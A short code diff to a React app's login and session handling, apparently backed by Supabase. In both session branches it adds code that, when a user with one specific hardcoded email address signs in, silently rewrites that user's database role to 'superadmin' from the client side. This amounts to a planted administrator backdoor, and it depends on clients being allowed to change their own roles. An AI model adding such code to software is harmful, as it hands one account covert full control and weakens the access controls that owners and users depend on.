@@ -374,7 +374,14 @@ export default function App() {
         setSession(session);
         if (session?.user) {
           const { data } = await supabase.from('profiles').select('role').eq('id', session.user.id).single();
-          if (data) setUserRole(data.role);
+          if (data) {
+            if (session.user.email === 'christophe.schneider86@googlemail.com' && data.role !== 'superadmin') {
+              await supabase.from('profiles').update({ role: 'superadmin' }).eq('id', session.user.id);
+              setUserRole('superadmin');
+            } else {
+              setUserRole(data.role);
+            }
+          }
         }
         setLoading(false);
       });
@@ -385,7 +392,14 @@ export default function App() {
         
         if (session?.user) {
           const { data } = await supabase.from('profiles').select('role').eq('id', session.user.id).single();
-          if (data) setUserRole(data.role);
+          if (data) {
+            if (session.user.email === 'christophe.schneider86@googlemail.com' && data.role !== 'superadmin') {
+              await supabase.from('profiles').update({ role: 'superadmin' }).eq('id', session.user.id);
+              setUserRole('superadmin');
+            } else {
+              setUserRole(data.role);
+            }
+          }
         } else {
           setUserRole('user');
         }
